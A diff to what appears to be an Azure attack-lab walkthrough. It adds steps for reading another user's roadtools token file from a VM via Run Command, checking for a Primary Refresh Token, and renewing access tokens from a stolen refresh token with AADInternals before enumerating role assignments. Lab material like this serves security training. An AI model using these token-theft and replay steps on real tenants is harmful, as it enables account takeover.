@@ -153,6 +153,18 @@ As we learned, roadrecon writes a file with the access token called `.roadtools_
 1. Login to portal.azure.com as user2
 2. Run the following command on the Win11 VM from the Run Command Window in the Azure portal:
 3. `type c:\users\user1\desktop\.roadtools_auth`
+
+
+If the file is empty, then make sure `user1` is logged in properly:
+1. RDP and login to the Win11 VM using the user `user1@YOURDOMAIN.onmicrosoft.com`
+2. run `dsregcmd /status` and make sure you don't have "invalid".. fields, and that you see `AzureAdPrt : YES`
+   ![prt](prtexists.png)
+3. Make sure you are verified:
+   1. open Edge and make sure you have your profile logged in
+   2. go to Start -> Account Info and make sure you don't have any warning about not being verified, if you have then verify yourself.
+      ![verify](verifyAccount.png)
+4. if there's still an issue, restart the vm and login again
+5. if it's still empty, rerun the task scheduler ![runTask](runTask.png)
 </details>
 
 ## Step 3
@@ -176,11 +188,15 @@ $tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#
 
 Connect-AzureAD -AccountId  $userUPN -TenantId $tenantId -AadAccessToken $at
 Connect-AzAccount -AccountId  $userUPN -TenantId $tenantId -AccessToken $at 
+
+# If it doesn't work, verify the access token— if it has expired, renew it by:
+$refreshToken = <the refresh token from the `roadtools_auth` file>
+$at=Get-AADIntAccessTokenWithRefreshToken -ClientId "1b730954-1685-4b74-9bfd-dac224a7b894" -Resource "https://graph.windows.net" -TenantId $tenantId -RefreshToken $refreshToken
 ```
 </details>
 
 <details>
-    <summary><b>Hint 2</b></summary>
+    <summary><b>Hint 3</b></summary>
     
 ```powershell
 # List current user's Azure Role Assignments using Azure PowerShell
@@ -194,7 +210,7 @@ $roleAssignments | ForEach-Object {
 </details>
 
 <details>
-    <summary><b>Hint 3</b></summary>
+    <summary><b>Hint 4</b></summary>
     
     We can see that there's a storage account that this user has access to..
 </details>
@@ -213,6 +229,9 @@ $tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#
 Connect-AzureAD -AccountId $userUPN -TenantId $tenantId -AadAccessToken $at
 Connect-AzAccount -AccountId $userUPN -TenantId $tenantId -AccessToken $at 
 
+# If it doesn't work, verify the access token— if it has expired, renew it by:
+$refreshToken = <the refresh token from the `roadtools_auth` file>
+$at=Get-AADIntAccessTokenWithRefreshToken -ClientId "1b730954-1685-4b74-9bfd-dac224a7b894" -Resource "https://graph.windows.net" -TenantId $tenantId -RefreshToken $refreshToken
 
 # List current user's Azure Role Assignments using Azure PowerShell
 $userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
